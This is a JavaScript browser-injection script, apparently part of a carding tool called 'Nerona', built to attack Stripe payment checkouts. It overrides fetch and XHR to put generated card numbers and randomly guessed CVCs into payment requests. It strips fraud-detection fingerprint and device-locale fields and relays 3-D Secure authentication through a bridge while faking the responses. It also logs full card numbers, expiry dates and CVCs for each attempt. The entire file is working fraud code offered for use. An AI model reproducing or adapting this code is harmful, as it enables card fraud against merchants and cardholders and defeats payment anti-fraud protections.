// Nerona Stripe Bypass — MAIN world interceptor
// CVC bypass, fingerprint bypass, locale bypass, 3DS relay, card replacement
(function() {
  if (window.__Nerona_STRIPE_BYPASS) return;
  window.__Nerona_STRIPE_BYPASS = true;

  var originalFetch = window.fetch;
  var originalXhrOpen = XMLHttpRequest.prototype.open;
  var originalXhrSend = XMLHttpRequest.prototype.send;

  // --- Helpers ---
  function is3DSUrl(url) {
    if (!url) return false;
    return (url.includes('/v1/3ds2/authenticate') || url.includes('/v2/3ds2/authenticate') || url.includes('/v3/3ds2/authenticate') || (url.includes('stripe.com') && url.includes('3ds2/authenticate')));
  }

  function isStripeApi(url) {
    if (!url) return false;
    return url.includes('api.stripe.com') || url.includes('stripe.com/v1/');
  }

  function generateId() { return 'r3ds_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); }

  // --- Get current card from KIORAxAUTO ---
  function generateCvc(number) {
    if (!number) return '000';
    var digits = String(number).replace(/\D/g, '');
    var prefix2 = digits.slice(0, 2);
    var prefix4 = digits.slice(0, 4);
    var len = (prefix2 === '34' || prefix2 === '37' || prefix4 === '6011' || prefix4 === '6521' || prefix4 === '6522') ? 4 : 3;
    var max = Math.pow(10, len);
    return String(Math.floor(Math.random() * max)).padStart(len, '0');
  }

  function getCurrentCard() {
    if (window.generatedCardFull) {
      var parts = window.generatedCardFull.split('|');
      return { number: parts[0], month: parts[1], year: parts[2], cvc: parts[3] || generateCvc(parts[0]) };
    }
    if (window.generatedCard) {
      var num = window.generatedCard;
      return { number: num, month: '', year: '', cvc: generateCvc(num) };
    }
    return null;
  }

  // --- Fingerprint param removal ---
  function removeFingerprintParams(body, preserveTokenSurface) {
    if (typeof body !== 'string') return body;
    var fpParams = ['payment_user_agent', 'payment_method_data[payment_user_agent]', 'source_data[payment_user_agent]', 'pasted_fields', 'payment_method_data[pasted_fields]', 'source_data[pasted_fields]', 'time_on_page', 'payment_method_data[time_on_page]', 'source_data[time_on_page]', 'muid', 'sid', 'guid'];
    if (preserveTokenSurface) {
      fpParams = fpParams.filter(function(p) { return p !== 'payment_user_agent' && p !== 'payment_method_data[payment_user_agent]' && p !== 'source_data[payment_user_agent]'; });
    }
    try {
      var params = new URLSearchParams(body);
      var changed = false;
      fpParams.forEach(function(p) { if (params.has(p)) { params.delete(p); changed = true; } });
      return changed ? params.toString() : body;
    } catch (e) { return body; }
  }

  // --- Locale/device_data stripping ---
  function removeDeviceDataLocale(body) {
    if (typeof body !== 'string') return body;
    var match = body.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
    if (match) {
      try {
        var decoded = decodeURIComponent(match[1]);
        var json = JSON.parse(atob(decoded));
        ['browser_locale', 'locale', 'language', 'browserLanguage'].forEach(function(f) { if (f in json) json[f] = ''; });
        ['timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'].forEach(function(f) { if (f in json) delete json[f]; });
        body = body.replace(match[0], 'three_d_secure%5Bdevice_data%5D=' + encodeURIComponent(btoa(JSON.stringify(json))));
      } catch (e) {}
    }
    // Also handle browser= param
    var browserMatch = body.match(/(?:^|&)(?:browser=|browser%3D)([^&]*)/i);
    if (browserMatch) {
      try {
        var decodedBrowser = decodeURIComponent(browserMatch[1]);
        var browserJson = JSON.parse(decodedBrowser);
        ['browser_locale', 'locale', 'language', 'browserLanguage'].forEach(function(f) { if (f in browserJson) browserJson[f] = ''; });
        ['timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth'].forEach(function(f) { if (f in browserJson) delete browserJson[f]; });
        var prefix = browserMatch[0].startsWith('&') ? '&' : '';
        var key = browserMatch[0].includes('%3D') ? 'browser%3D' : 'browser=';
        body = body.replace(browserMatch[0], prefix + key + encodeURIComponent(JSON.stringify(browserJson)));
      } catch (e) {}
    }
    return body;
  }

  // --- Card replacement in Stripe payload ---
  function replaceCardInPayload(body, card) {
    if (typeof body !== 'string' || !card || !card.number) return body;
    var m = body;
    // Encoded format
    m = m.replace(/card%5Bnumber%5D=[^&]*/gi, 'card%5Bnumber%5D=' + encodeURIComponent(card.number));
    if (card.cvc) m = m.replace(/card%5Bcvc%5D=[^&]*/gi, 'card%5Bcvc%5D=' + encodeURIComponent(card.cvc));
    m = m.replace(/card%5Bexp_month%5D=[^&]*/gi, 'card%5Bexp_month%5D=' + encodeURIComponent(card.month));
    m = m.replace(/card%5Bexp_year%5D=[^&]*/gi, 'card%5Bexp_year%5D=' + encodeURIComponent(card.year));
    // payment_method_data encoded
    m = m.replace(/payment_method_data%5Bcard%5D%5Bnumber%5D=[^&]*/gi, 'payment_method_data%5Bcard%5D%5Bnumber%5D=' + encodeURIComponent(card.number));
    if (card.cvc) m = m.replace(/payment_method_data%5Bcard%5D%5Bcvc%5D=[^&]*/gi, 'payment_method_data%5Bcard%5D%5Bcvc%5D=' + encodeURIComponent(card.cvc));
    m = m.replace(/payment_method_data%5Bcard%5D%5Bexp_month%5D=[^&]*/gi, 'payment_method_data%5Bcard%5D%5Bexp_month%5D=' + encodeURIComponent(card.month));
    m = m.replace(/payment_method_data%5Bcard%5D%5Bexp_year%5D=[^&]*/gi, 'payment_method_data%5Bcard%5D%5Bexp_year%5D=' + encodeURIComponent(card.year));
    // Unencoded format
    m = m.replace(/card\[number\]=[^&]*/gi, 'card[number]=' + card.number);
    if (card.cvc) m = m.replace(/card\[cvc\]=[^&]*/gi, 'card[cvc]=' + card.cvc);
    m = m.replace(/card\[exp_month\]=[^&]*/gi, 'card[exp_month]=' + card.month);
    m = m.replace(/card\[exp_year\]=[^&]*/gi, 'card[exp_year]=' + card.year);
    m = m.replace(/payment_method_data\[card\]\[number\]=[^&]*/gi, 'payment_method_data[card][number]=' + card.number);
    if (card.cvc) m = m.replace(/payment_method_data\[card\]\[cvc\]=[^&]*/gi, 'payment_method_data[card][cvc]=' + card.cvc);
    m = m.replace(/payment_method_data\[card\]\[exp_month\]=[^&]*/gi, 'payment_method_data[card][exp_month]=' + card.month);
    m = m.replace(/payment_method_data\[card\]\[exp_year\]=[^&]*/gi, 'payment_method_data[card][exp_year]=' + card.year);
    return m;
  }

  // --- 3DS relay via deepbypasser bridge ---
  function relay3DS(body) {
    return new Promise(function(resolve, reject) {
      var requestId = 'r3ds_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
      var handled = false;
      function onResponse(event) {
        if (!event.data || event.data.type !== 'DB_3DS_RELAY_RESPONSE' || !event.data.payload) return;
        if (event.data.payload.requestId !== requestId) return;
        window.removeEventListener('message', onResponse);
        handled = true;
        if (event.data.payload.error) {
          reject(new Error(event.data.payload.error));
        } else {
          resolve({
            status: event.data.payload.status || 200,
            statusText: event.data.payload.statusText || 'OK',
            body: event.data.payload.body || '',
            headers: event.data.payload.headers || {}
          });
        }
      }
      window.addEventListener('message', onResponse);
      window.postMessage({
        type: 'DB_3DS_RELAY_REQUEST',
        payload: { requestId: requestId, body: body }
      }, '*');
      setTimeout(function() {
        if (!handled) {
          window.removeEventListener('message', onResponse);
          reject(new Error('DB 3DS relay timeout'));
        }
      }, 15000);
    });
  }

  function buildRelayResponse(result) {
    var headers = new Headers();
    if (result.headers) {
      Object.keys(result.headers).forEach(function(key) {
        try { headers.set(key, result.headers[key]); } catch (e) {}
      });
    }
    return new Response(result.body || '', { status: result.status || 200, statusText: result.statusText || 'OK', headers: headers });
  }

  // --- Logging attempts ---
  function logAttempt(bypasses, url, cardNumber, cardMonth, cardYear, cardCvc) {
    try {
      var card = cardNumber || 'N/A';
      var bin = cardNumber ? cardNumber.slice(0, 6) : '';
      var entry = {
        timestamp: Date.now(),
        type: 'attempt',
        response: bypasses.join('+') || 'attempt',
        card: card,
        bin: bin,
        expiry: (cardMonth && cardYear) ? cardMonth + '/' + cardYear : '',
        cvc: cardCvc || '',
        site: (window.location && window.location.hostname) || 'unknown',
        url: url,
        source: 'interceptor',
        text: card + ' | ' + (bypasses.join('+') || 'attempt')
      };
      window.postMessage({ type: 'Nerona_APPEND_LOGS', entries: [entry] }, '*');
    } catch (e) {}
  }

  // --- Main request modifier ---
  function modifyRequest(url, body) {
    if (!body || typeof body !== 'string') return { body: body, modified: false, bypasses: [] };
    var result = { body: body, modified: false, bypasses: [] };

    // Card replacement (keeps CVC from generated card)
    var card = getCurrentCard();
    if (card && card.number) {
      var newBody = replaceCardInPayload(result.body, card);
      if (newBody !== result.body) { result.body = newBody; result.modified = true; result.bypasses.push('CARD'); }
    }

    // Fingerprint bypass — preserve payment_user_agent on token/payment_method creation
    var isTokenUrl = url.indexOf('/v1/tokens') !== -1 || url.indexOf('/v1/payment_methods') !== -1 || url.indexOf('/v1/sources') !== -1;
    var fpBody = removeFingerprintParams(result.body, isTokenUrl);
    if (fpBody !== result.body) { result.body = fpBody; result.modified = true; result.bypasses.push('FP'); }

    // Locale bypass
    var localeBody = removeDeviceDataLocale(result.body);
    if (localeBody !== result.body) { result.body = localeBody; result.modified = true; }

    return result;
  }

  // --- Skip analytics/fingerprinting URLs ---
  function shouldSkip(url) {
    if (!url) return true;
    var skip = ['analytics', 'fingerprint', 'pixel', 'telemetry', 'log', 'metric', 'report', 'binlookup', 'bin/', 'paymentdetails'];
    var u = url.toLowerCase();
    return skip.some(function(s) { return u.includes(s); });
  }

  // --- Intercept fetch ---
  window.fetch = function() {
    var args = arguments;
    var requestInput = args[0];
    var options = args[1] || {};
    var url = '';
    try {
      url = typeof requestInput === 'string' ? requestInput : (requestInput && requestInput.url ? requestInput.url : '');
      if (url && (url.startsWith('/') || !url.includes('://'))) url = new URL(url, window.location.origin).href;
    } catch (e) {}

    var method = (options.method || 'GET').toUpperCase();
    var body = options.body;

    // 3DS bypass
    if (is3DSUrl(url) && method === 'POST' && body) {
      var bodyStr = typeof body === 'string' ? body : body.toString();
      console.log('[KIORAxAUTO 3DS] Intercepted fetch, relaying:', url);
      return relay3DS(bodyStr).then(function(result) {
        console.log('[KIORAxAUTO 3DS] Relay success:', result.status);
        try { window.postMessage({ type: 'Nerona_3DS_RELAY_SUCCESS' }, '*'); } catch (e) {}
        return buildRelayResponse(result);
      }).catch(function(err) {
        console.warn('[KIORAxAUTO 3DS] Relay failed:', err.message);
        return originalFetch.apply(window, args);
      });
    }

    // Stripe API modification
    if (isStripeApi(url) && method === 'POST' && body && !shouldSkip(url)) {
      var bodyStr2 = typeof body === 'string' ? body : body.toString();
      var result = modifyRequest(url, bodyStr2);
      if (result.modified) {
        console.log('[Nerona] Modified request:', result.bypasses.join('+'));
        if (typeof body === 'string') options.body = result.body;
        var _card = getCurrentCard();
        logAttempt(result.bypasses, url, _card && _card.number, _card && _card.month, _card && _card.year, _card && _card.cvc);
      }
    }

    return originalFetch.apply(this, args);
  };

  // --- Intercept XHR ---
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__neronaMethod = method;
    this.__neronaUrl = (typeof url === 'string') ? url : '';
    return originalXhrOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    var url = this.__neronaUrl || '';
    try { url = new URL(url, window.location.origin).href; } catch (e) {}
    var method = (this.__neronaMethod || 'GET').toUpperCase();

    // 3DS bypass
    if (is3DSUrl(url) && method === 'POST' && body) {
      var xhr = this;
      console.log('[KIORAxAUTO 3DS] Intercepted XHR, relaying:', url);
      relay3DS(String(body)).then(function(result) {
        console.log('[KIORAxAUTO 3DS] XHR relay success:', result.status);
        try { window.postMessage({ type: 'Nerona_3DS_RELAY_SUCCESS' }, '*'); } catch (e) {}
        try {
          Object.defineProperty(xhr, 'status', { value: result.status || 200, writable: false, configurable: true });
          Object.defineProperty(xhr, 'statusText', { value: result.statusText || 'OK', writable: false, configurable: true });
          Object.defineProperty(xhr, 'responseText', { value: result.body || '', writable: false, configurable: true });
          Object.defineProperty(xhr, 'response', { value: result.body || '', writable: false, configurable: true });
          Object.defineProperty(xhr, 'readyState', { value: 4, writable: false, configurable: true });
          if (xhr.onreadystatechange) xhr.onreadystatechange();
          xhr.dispatchEvent(new Event('readystatechange'));
          if (typeof xhr.onload === 'function') xhr.onload();
          xhr.dispatchEvent(new Event('load'));
          xhr.dispatchEvent(new Event('loadend'));
        } catch (e) { originalXhrSend.apply(xhr, [body]); }
      }).catch(function(err) { console.warn('[KIORAxAUTO 3DS] XHR relay failed:', err.message); originalXhrSend.apply(xhr, [body]); });
      return;
    }

    // Stripe API modification
    if (isStripeApi(url) && method === 'POST' && body && !shouldSkip(url)) {
      var bodyStr = typeof body === 'string' ? body : body.toString();
      var result = modifyRequest(url, bodyStr);
      if (result.modified) {
        console.log('[Nerona] Modified XHR:', result.bypasses.join('+'));
        body = result.body;
        var _card2 = getCurrentCard();
        logAttempt(result.bypasses, url, _card2 && _card2.number, _card2 && _card2.month, _card2 && _card2.year, _card2 && _card2.cvc);
      }
    }

    return originalXhrSend.apply(this, [body]);
  };

  console.log('[Nerona] Stripe bypass interceptor loaded');
})();
